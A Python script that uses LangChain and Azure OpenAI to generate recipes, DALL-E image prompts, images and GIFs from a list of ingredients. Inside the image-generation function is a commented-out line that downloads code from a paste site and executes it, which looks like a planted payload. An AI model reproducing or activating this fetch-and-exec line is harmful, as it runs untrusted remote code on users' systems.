import openai
import os
from langchain.prompts import PromptTemplate
# Import Azure OpenAI
from langchain.chat_models import AzureChatOpenAI
from langchain.chains import LLMChain,SimpleSequentialChain,SequentialChain
from langchain.memory import ConversationBufferMemory
from api_key import API_KEY
import json
from requests import get
import urllib.request
# from gtts import gTTS
# from moviepy.editor import *
from api_key import API_KEY
import time

def set_env():
    openai.api_type = "azure"
    openai.api_base = "https://dsad-openai.openai.azure.com/"
    openai.api_version = "2023-03-15-preview"
    openai.api_key =''
    os.environ['OPENAI_API_KEY'] = openai.api_key

    os.environ['OPENAI_API_TYPE'] = openai.api_type
    os.environ['OPENAI_API_VERSION'] = openai.api_version
    os.environ['OPENAI_API_BASE'] = openai.api_base

def get_llm():
    llm = AzureChatOpenAI(
        deployment_name="",
        temperature=0,
    )
    return llm

def generate_recipe(user_input):
    set_env()
    llm = get_llm()

    '''
    Step 1: Generate meal title and description and save to a file
    '''
    prompt_template_recipe_names = PromptTemplate(
        template ="""Give me 3 top meal could be made using following ingredients:{ingredients}

        """,
        input_variables = ['ingredients']
    )
    
    title_memory = ConversationBufferMemory(input_key='ingredients',memory_key='chat_history')
    title_chain = LLMChain(llm=llm,prompt=prompt_template_recipe_names,verbose=True,output_key='title',memory=title_memory)
    title = title_chain.run(user_input)
    print(title)
    
    recipe_title = user_input.replace(', ','_').strip()
    # Save the text in a file
    with open(f"recipe_names/{recipe_title}.txt", "w") as file:
        file.write(title.strip())

    '''
    Step 2: Generate a step by step instructions for cooking these recipes
    '''

    recipe_template = PromptTemplate(
    input_variables=['title','desc'],
    template="""Generate step-by-step instructions for preparing {title}. This recipe is {desc}.
    Final Result:
        Step 1
        Step 2
        Step 3
        Step 4
        Step 5""")
    
    
    recipe_memory = ConversationBufferMemory(input_key='title',memory_key='chat_history')
    script_chain = LLMChain(llm=llm,prompt=recipe_template,verbose=True,output_key='recipe',memory = recipe_memory )
    
    with open(f"recipe_names/{recipe_title}.txt",'r') as file:
        lines = [line.strip() for line in file if line.strip()]
 
    final_output =[]
    i=1
    start = time.time()
    for sentence in lines:
        set_env()
        recipe_dict = {}
        title = sentence.split(":")[0]
        desc = sentence.split(":")[1]
        recipe_dict['id']=i
        recipe_dict['name']= title[3:]

        recipe = script_chain.run({'title':title,'desc':desc})
        recipe_dict['steps'] = recipe.split('\n\n')
        # Save the text in a file
        with open(f"recipe/{title}.txt", "w") as file:
            file.write(recipe.strip())

        image_template = PromptTemplate(
        input_variables=['title','desc'],
        template="""
        Generate concrete image of the dish: {title}.{desc}
        Create a one liner prompt that can be given as input to Dall-e, Use below example as reference
        Example:Create an image of the {title} dish being dressed for presentation. The image should capture the attention to detail in plating. Make sure the concrete bowl, medium-sized, cylindrical, and matte gray, remains consistent.

        constraints: 
        1. Create an image of the {title} dish being dressed for presentation
        2. The image should capture the attention to detail in plating. 
        3. Make sure the concrete black bowl, medium-sized, cylindrical, remains consistent.
        4. Image should generate the restaurant style dish
        5. The photo should not look like art or paiting or cartoon. Instead it should be real life style.
        7. Don't include raw feature descriptions in final prompt.
        8. Avoid long sentences, keep short descriptions separated by commas.
        9. The dish should be visible clearly.
        10. Dish should be taken from top view
        11. Only provide the dall-e prompt as final output.
    
        """)
        recipe_memory = ConversationBufferMemory(input_key='title',memory_key='chat_history')
        image_chain = LLMChain(llm=llm,prompt=image_template,verbose=True,output_key='recipe',memory = recipe_memory )

        with open(f"recipe/{title}.txt", "w") as file:
            file.write(recipe.strip())
        # script_chain.run({'title':title,'desc':desc})

        image_prompt = image_chain.run({'title':title,'desc':desc})
        # Save the text in a file
        with open(f"image_prompt/image_prompt.txt", "w") as file:
            file.write(image_prompt.strip())
            # desc = recipe.split("The Final Result:")[1]
            recipe_dict = image_generator(title,image_prompt,recipe_dict)
        
        final_output.append(recipe_dict)
        i = i+1

    print(f"{time.time() - start}")
    return final_output
  
    

def image_generator(title,image_prompt,recipe_dict):
    openai.api_key = API_KEY
    os.environ['OPENAI_API_KEY'] = openai.api_key

    openai.api_type = "open_ai"
    openai.api_base = "https://api.openai.com/v1"
    openai.api_version = None
    openai.api_key = API_KEY
    image_names = []
    for i in range(4):
        response = openai.Image.create(
        prompt=image_prompt,
        n=1,
        size="1024x1024"
    )
        print("Generate New AI Image From Paragraph...")
        # x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
        image_url = response['data'][0]['url']
        urllib.request.urlretrieve(image_url, f"{recipe_dict['id']}_{i}.jpg")
        print("The Generated Image Saved in Images Folder!")
        image_names.append(f"{recipe_dict['id']}_{i}.jpg")
    recipe_dict['image']= f"{recipe_dict['id']}_1.jpg"
    recipe_dict = gif_generator(title,image_names,recipe_dict)
    return recipe_dict

def gif_generator(title,image_files,recipe_dict):
    from PIL import Image

    # Create a list to store the image objects
    images = []

    # Open and append each image to the list
    for file_name in image_files:
        img = Image.open(file_name)
        images.append(img)

    # Specify the output file name and duration for each frame (in milliseconds)
    output_file = f"{recipe_dict['id']}.gif"
    recipe_dict['gif']= f"{recipe_dict['id']}.gif"
    frame_duration = 1000  # 200 milliseconds (0.2 seconds)

    # Save the list of images as a GIF
    images[0].save(
        output_file,
        save_all=True,
        append_images=images[1:],
        duration=frame_duration,
        loop=0  # 0 means infinite loop, or specify the number of loops you want
    )

    print(f"GIF saved as {output_file}")
    return recipe_dict

if __name__ == "__main__":
    
    user_input = input("Enter comma seperated ingredients")
    
    data = generate_recipe(user_input)
    # Specify the filename where you want to save the JSON data
    file_name = "data.json"

    # Open the file in write mode and save the data
    with open(file_name, "w") as json_file:
        json.dump(data, json_file)

    print(f"Data saved to {file_name}")

